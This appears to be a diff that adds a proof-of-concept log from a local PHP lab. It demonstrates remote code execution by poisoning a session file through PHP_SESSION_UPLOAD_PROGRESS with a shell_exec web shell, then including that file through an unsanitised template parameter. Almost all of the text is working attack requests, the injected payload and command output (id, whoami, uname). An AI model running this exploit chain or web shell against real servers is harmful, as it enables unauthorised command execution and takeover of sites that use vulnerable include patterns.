@@ -1,0 +1,17 @@
+# Local MiniCMS lab: index.php (session_start), view.php (include($_GET['tpl']))
+# PHP 8.4.4, session.save_path=/tmp/rce-demo/sess, cleanup=0
+#
+# poison:
+POST /index.php  multipart
+  PHPSESSID=shellpoc1
+  PHP_SESSION_UPLOAD_PROGRESS=<?php echo "SHELL>"; echo shell_exec($_GET["c"]); echo "<END";?>
+-> HTTP/1.1 200 OK
+#
+# session file:
+upload_progress_<?php echo "SHELL>"; echo shell_exec($_GET["c"]); echo "<END";?>|a:5:{...}
+#
+# include sink:
+GET /view.php?tpl=/tmp/rce-demo/sess/sess_shellpoc1&c=id
+-> SHELL>uid=501(<lab-user>) gid=20(staff) groups=20(staff),...<END
+GET ...&c=whoami   -> <lab-user>
+GET ...&c=uname -s -> Darwin
